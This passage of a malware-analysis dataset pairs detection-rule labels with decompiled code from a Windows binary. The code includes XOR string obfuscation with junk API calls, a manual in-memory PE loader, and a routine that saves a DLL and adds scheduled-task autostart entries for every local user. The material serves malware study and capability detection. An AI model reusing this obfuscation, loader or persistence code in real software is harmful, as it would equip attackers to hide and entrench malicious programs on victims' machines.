iVar3 = (*_sym.imp.USERENV.dll_GetProfilesDirectoryW)(lpProfileDir, &lpcchSize);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)(lpFileName, L\"%s\\\\*\", uVar2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        var_34h = iVar3;\n        while (iVar3 != -1) {\n            iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4109e8);\n            if ((iVar6 != 0) && (iVar6 = (*_sym.imp.SHLWAPI.dll_StrCmpW)(&psz1, 0x4109ec),  iVar6 != 0)) {\n                var_54h = 0;\n                var_44h = 0x711f4e14;\n                var_40h._0_2_ = 0x4858;\n                stack0xfffffff4 = 0x71354e48;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x58);\n                var_4ch = 0x4f774b6d;\n                var_48h._0_2_ = 0x526a;\n                do {\n                    (*_sym.imp.SHLWAPI.dll_StrCpyW)(lpFileName, uVar2);\n                    uVar2 = (*pcVar5)(8, 0xd);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_5ch = iVar3;\n                    var_58h = &var_44h - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                        if (iVar4 != 0xda0201) {\n                            *(iVar6 + iVar3) = *(&var_9h + iVar6 % var_60h + 1) ^ (iVar6 + iVar3)[&var_44h - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 6);\n                    (*_sym.imp.SHLWAPI.dll_StrCatW)(lpFileName, iVar3);\n                    stack0xffffffdf = stack0xffffffdf & 0xff | 0x44b4800;\n                    stack0xffffffe3 = 0x4852364f;\n                    var_18h._3_1_ = 0x4b;\n                    var_14h._0_2_ = 0x4f04;\n                    var_14h._2_1_ = 0x36;\n                    stack0xffffffeb = 0x44b4852;\n                    var_dh._0_1_ = 0x4f;\n                    var_dh._1_1_ = 0x6a;\n                    var_dh._2_1_ = 0x52;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                    iVar6 = 0;\n                    var_58h = &var_1ch - iVar3;\n                    do {\n                        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n                        if (iVar4 != 0xfe43b0) {\n                            *(iVar6 + iVar3) = *(&var_4ch + iVar6 % var_50h) ^ (iVar6 + iVar3)[&var_1ch - iVar3];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x12);\n                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar3, lpProfileDir, &psz1, (&var_78h)[var_54h]);\n                    fcn.00404883(1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                    uVar2 = (*pcVar5)(0, var_5ch);\n                    (*pcVar1)(uVar2);\n                    var_54h = var_54h + 1;\n                    uVar2 = lpProfileDir;\n                    iVar3 = var_34h;\n                } while (var_54h < 2);\n            }\n            iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, &lpFindFileData);\n            if (iVar6 == 0) {\n                (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n                iVar3 = -1;\n                var_34h = -1;\n            }\n        }\n    }\n    var_2ch._0_2_ = 0x6675;\n    var_2ch._2_1_ = 0x29;\n    stack0xffffffd3 = 0x15502155;\n    stack0xffffffd7 = 0x3558217a;\n    stack0xffffffdb = 0xa551766;\n    stack0xffffffdf = 0x3a7a0950;\n    stack0xffffffe3 = 0x5f662458;\n    var_18h._3_1_ = 0x55;\n    var_14h._0_2_ = 0x5004;\n    var_14h._2_1_ = 0x32;\n    stack0xffffffeb = 0x3d58307a;\n    var_dh._0_1_ = 0x66;\n    var_dh._1_1_ = 10;\n    var_dh._2_1_ = 0x55;\n    var_dh._3_1_ = 0x58;\n    var_9h._0_1_ = 0x50;\n    stack0xfffffff4 = 0x557a6650;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x58);\n    uVar2 = (*pcVar5)(8, 0x49);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_5ch = &var_2ch - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar4 != 0x85c209) {\n            *(iVar6 + iVar3) = *(&var_9h + iVar6 % var_60h + 1) ^ (iVar6 + iVar3)[&var_2ch - iVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x24);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar3, lpProfileDir, 0x104);\n    fcn.00404883(1);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, ARG_0);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpProfileDir);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, lpMem);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, var_68h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    return;\n}\n",
        "token_count": 3163
    },
    "004059b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004059b5(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t *piVar9;\n    uint32_t uVar10;\n    uint32_t in_EDX;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpBuffer;\n    int32_t lpFindFileData;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0;\n    var_20h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (iVar5 == 0) {\n        return var_20h;\n    }\n    lpFindFileData = iVar5;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x00405c76;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x5a695869;\n        var_44h = 0x433d355c;\n        var_40h = 0x58507222;\n        piVar6 = lpMem;\n        for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n        var_3ch._0_2_ = 0x5a43;\n        var_34h = 0x5a435835;\n        var_30h._0_1_ = 0x72;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar6 = (*pcVar3)(uVar4);\n        iVar5 = 0;\n        var_38h = piVar6;\n        do {\n            iVar7 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar12 = lpBuffer;\n            if (iVar7 != 0xae4779) {\n                var_18h = 5;\n                *(iVar5 + piVar6) = *(&var_34h + iVar5 % 5) ^ (iVar5 + piVar6)[&var_48h - piVar6];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xe);\n        piVar9 = piVar6;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar6 + 1) >> 1));\n        if (iVar5 == 0) {\ncode_r0x00405c48:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        else {\n            if (var_14h == 0) {\n                var_1ch = fcn.00407a32();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00407a32();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar6);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x00405c48;\n            iVar5 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar7 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar5 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar7 + (-0x2c - iVar5) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar6 = lpMem;\n                    do {\n                        iVar1 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar6 = lpMem + (piVar6 - (lpMem + 1) >> 1); *piVar6 != 0; piVar6 = piVar6 + 1) {\n                    }\n                    var_28h = iVar5 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar7 = var_28h - piVar6;\n                        uVar8 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar5 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar6 = uVar8;\n                            piVar6 = piVar6 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar7 + piVar6);\n                            uVar8 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar6 = 0;\n                    var_2ch = var_34h;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar5);\n                if (iVar7 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar5);\n                }\n            }\n            *arg_10h = lpMem;\n            var_20h = 1;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar6 = var_38h;\n        }\n        uVar4 = (*pcVar11)(0, piVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar5 = lpFindFileData;\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x00405c76:\n    uVar4 = (*pcVar11)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return var_20h;\n}\n",
        "token_count": 1970
    },
    "0040700c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040700c(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1550
    },
    "00407234": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00407234(uint param_1, uint *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint noname_0;\n    uint noname_0_00;\n    int32_t iVar7;\n    uint *puVar8;\n    code *pcVar9;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint *var_7ch;\n    uint *var_78h;\n    int32_t lpMem;\n    uint var_70h;\n    uchar *pszFirst;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_4dh;\n    uint var_49h;\n    uint32_t var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint32_t var_39h;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_14h;\n    uint32_t var_10h;\n    uchar *ARG_0;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_78h = NULL;\n    var_9ch = 0;\n    var_98h = 0;\n    var_94h = 0;\n    var_7ch = param_2;\n    var_14h = param_1;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    pszFirst = puVar3;\n    fcn.00409d07();\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x21, param_2, param_1);\n    fcn.00401f6b(\"<%d>: EXE_SCHEDULER_INSTALL.CPP:%d > ExeInstallDllAsSheduledTaskAndStart : DataLength=%d, pData=%p\", \n                 uVar2);\n    if (puVar3 != NULL) {\n        var_68h = 0x322e5417;\n        var_64h = 0x6f043234;\n        var_60h = 0x54736476;\n        for (iVar6 = 0x208; pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        var_5ch = 0x3225323b;\n        var_58h = 0x646e6f71;\n        var_54h._0_2_ = 0x547f;\n        var_54h._2_1_ = 6;\n        stack0xffffffab = 0x26320732;\n        var_4dh = 0x41645d6f;\n        var_49h = 0x2320054;\n        var_45h = 0x6e6f2032;\n        var_41h = 0x1547b64;\n        var_3dh = 0x31321032;\n        var_39h = 0x5c64406f;\n        var_35h = 0x10320a54;\n        var_31h = 0x776f7432;\n        var_2dh._0_1_ = 100;\n        var_2dh._1_2_ = 0x544a;\n        var_2dh._3_1_ = 0x1f;\n        var_29h = 0x3b320832;\n        var_25h = 0x5764406f;\n        var_21h = 0x38321d54;\n        var_1dh._0_1_ = 0x32;\n        var_1dh._1_1_ = 0x54;\n        var_1dh._2_1_ = 0x6f;\n        lpMem = 0x326f5432;\n        var_70h._0_1_ = 100;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x9d);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        ARG_0 = 0x5;\n        iVar7 = 0;\n        var_10h = &var_68h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetInputState)();\n            if (iVar4 != 0x21171d) {\n                *(iVar7 + iVar6) = *(&lpMem + iVar7 % ARG_0) ^ (iVar7 + iVar6)[var_10h];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n        var_39h = var_39h & 0xff | 0x35620400;\n        var_35h = 0x16774141;\n        var_31h = 0x1a32244c;\n        var_2dh._0_1_ = 0x62;\n        var_2dh._1_2_ = 0x413c;\n        var_2dh._3_1_ = 0x40;\n        var_29h = 0x274c0d77;\n        var_25h = 0x20621e32;\n        var_21h = 0x62775741;\n        var_1dh._0_1_ = 0x4c;\n        var_8h = 0x414c6277;\n        var_4h._0_1_ = 0x32;\n        uVar2 = (*pcVar9)(8, 0x39);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar4 = 0;\n        var_10h = &var_39h + (1 - iVar7);\n        lpMem = iVar7;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            puVar3 = pszFirst;\n            if (iVar5 != 0xeb1e31) {\n                *(iVar4 + iVar7) = *(&var_8h + iVar4 % ARG_0) ^ (iVar4 + iVar7)[var_10h];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x1c);\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar7);\n        if (iVar7 != 0) {\n            var_45h = var_45h & 0xff | 0x2511600;\n            var_41h = 0x22331270;\n            var_3dh = 0x566b0451;\n            var_39h = 0x39703c51;\n            var_35h = 0x1f513e33;\n            var_31h = 0x7451476b;\n            var_2dh._0_1_ = 0x70;\n            var_2dh._1_2_ = 0x3337;\n            var_2dh._3_1_ = 5;\n            var_29h = 0x406b1151;\n            var_25h = 0x18703a51;\n            var_21h = 0x70510d33;\n            var_1dh._0_1_ = 0x6b;\n            var_8h = 0x70515133;\n            var_4h._0_1_ = 0x6b;\n            uVar2 = (*pcVar9)(8, 0x51);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar4 = 0;\n            var_10h = &var_45h + (1 - iVar7);\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                puVar3 = pszFirst;\n                if (iVar5 != 0x86b8f5) {\n                    *(iVar4 + iVar7) = *(&var_8h + iVar4 % ARG_0) ^ (iVar4 + iVar7)[var_10h];\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, pszFirst, 0x104);\n            uVar2 = (*pcVar9)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar3, *0x41dad4);\n        iVar7 = fcn.004047cf(var_7ch);\n        if (iVar7 == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x42, puVar3);\n            fcn.00401f6b(\"<%d>: EXE_SCHEDULER_INSTALL.CPP:%d > ExeInstallDllAsSheduledTaskAndStart : file saved as %ws\"\n                         , uVar2);\n            fcn.00404384();\n            do {\n                iVar7 = (*_sym.imp.NETAPI32.dll_NetUserEnum)\n                                  (0, 0, 2, &var_78h, 0xffffffff, &var_94h, &var_9ch, &var_98h);\n                var_8h = iVar7;\n                if ((iVar7 == 0) || (iVar7 == 0xea)) {\n                    var_7ch = var_78h;\n                    if (var_78h != NULL) {\n                        var_10h = 0;\n                        puVar8 = var_78h;\n                        if (var_94h != 0) {\n                            do {\n                                var_7ch = puVar8;\n                                if (puVar8 == NULL) break;\n                                uVar2 = (*pcVar9)(8, 0x208);\n                                pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n                                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (ARG_0 != NULL) {\n                                    puVar3 = ARG_0;\n                                    for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                        *puVar3 = 0;\n                                        puVar3 = puVar3 + 1;\n                                    }\n                                    var_14h = fcn.00404235();\n                                    var_90h = 0x6100617c;\n                                    var_8ch = 0x617c3707;\n                                    var_88h = 0x37586100;\n                                    var_84h = 0x61736159;\n                                    var_80h._0_2_ = 0x3758;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                                    iVar7 = (*pcVar1)(uVar2);\n                                    iVar4 = 0;\n                                    do {\n                                        iVar5 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                                        puVar3 = ARG_0;\n                                        puVar8 = var_7ch;\n                                        if (iVar5 != 0xd1ff3e) {\n                                            *(iVar4 + iVar7) =\n                                                 *(&var_84h + iVar4 % 6) ^ (iVar4 + iVar7)[&var_90h - iVar7];\n                                        }\n                                        iVar4 = iVar4 + 1;\n                                    } while (iVar4 < 0xc);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, iVar7, *var_7ch, var_14h);\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    var_14h = *puVar8;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x23d, var_14h, puVar3);\n                                    fcn.00401f6b(\"<%d>: TASK_SHEDULER.CPP:%d > SchTaskAddAndStart : add autostart pwszUserName=%ws, pwszTaskName=%ws\"\n                                                 , uVar2);\n                                    iVar4 = fcn.0040abd2(noname_0, var_14h);\n                                    if (iVar4 == 0) {\n                                        fcn.0040a653(noname_0_00, var_14h);\n                                    }\n                                    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    uVar2 = (*pcVar9)(0, iVar7);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                                puVar8 = puVar8 + 1;\n                                var_10h = var_10h + 1;\n                                var_7ch = puVar8;\n                            } while (var_10h < var_94h);\n                        }\n                        goto code_r0x004076fc;\n                    }\n                }\n                else {\ncode_r0x004076fc:\n                    iVar7 = var_8h;\n                    if (var_78h != NULL) {\n                        (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_78h);\n                        var_78h = NULL;\n                    }\n                }\n            } while (iVar7 == 0xea);\n            puVar3 = pszFirst;\n            if (var_78h != NULL) {\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_78h);\n                puVar3 = pszFirst;\n            }\n        }\n        else {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(0x97, puVar3, uVar2);\n            fcn.00401f6b(\"<%d>: EXE_SCHEDULER_INSTALL.CPP:%d > ExeInstallDllAsSheduledTaskAndStart : file save ERROR szFullDllName=%ws, le=%d\"\n                         , uVar2);\n        }\n        uVar2 = (*pcVar9)(0, puVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar9)(0, lpMem);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar9)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return 0;\n}\n",
        "token_count": 3477
    },
    "0040777c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
